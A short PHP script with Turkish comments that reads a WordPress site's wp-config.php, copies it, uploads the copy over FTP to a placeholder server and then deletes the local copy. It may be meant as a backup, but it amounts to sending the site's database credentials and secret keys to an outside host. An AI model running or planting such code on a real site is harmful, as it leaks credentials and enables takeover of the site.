<?php
// WordPress işlevselliğini dahil et
define('ABSPATH', dirname(__FILE__) . '/');
require_once(ABSPATH . 'wp-load.php');

// wp-config.php dosyasının yolu
$wp_config_path = ABSPATH . 'wp-config.php';

// FTP bağlantı bilgileri
$ftp_server = 'ftp.sunucuadresi.com';
$ftp_user = 'ftp_kullanici_adi';
$ftp_pass = 'ftp_sifre';
$ftp_path = '/hedef/klasor/yolu/'; // FTP sunucusunda dosyanın gönderileceği dizin

// wp-config.php dosyasının içeriğini oku
$wp_config_content = file_get_contents($wp_config_path);

// Yeni bir dosya adı oluştur
$filename = 'wp-config-copy.php'; // Gönderilecek dosyanın adı

// Yeni dosyayı oluştur ve içeriği yaz
if (file_put_contents($filename, $wp_config_content)) {
    echo "wp-config.php dosyası başarıyla kopyalandı.\n";

    // FTP bağlantısı oluştur
    $conn_id = ftp_connect($ftp_server);
    $login_result = ftp_login($conn_id, $ftp_user, $ftp_pass);

    // FTP'ye dosyayı gönder
    if ($login_result) {
        if (ftp_put($conn_id, $ftp_path . $filename, $filename, FTP_BINARY)) {
            echo "Dosya başarıyla FTP sunucusuna gönderildi: " . $filename . "\n";
        } else {
            echo "Dosya FTP sunucusuna gönderilemedi.\n";
        }
        ftp_close($conn_id);
    } else {
        echo "FTP sunucusuna bağlanılamadı.\n";
    }

    // Dosyayı sil
    unlink($filename);
} else {
    echo "wp-config.php dosyası kopyalanamadı.\n";
}
?>
